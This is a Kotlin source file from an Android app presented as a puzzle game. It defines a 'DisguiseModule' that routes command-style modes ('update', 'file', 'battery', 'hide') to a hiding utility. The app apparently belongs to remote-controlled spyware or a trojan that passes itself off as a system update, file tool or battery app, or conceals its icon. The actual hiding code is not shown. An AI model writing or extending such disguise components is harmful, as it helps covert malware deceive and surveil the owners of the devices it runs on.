package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Hide

object DisguiseModule {
    suspend fun disguise(ctx: Context, mode: String): String {
        return when (mode) {
            "update", "file", "battery", "hide" -> Hide.disguise(ctx, mode)
            else -> "🎭 unknown mode. use: update|file|battery|hide"
        }
    }
}
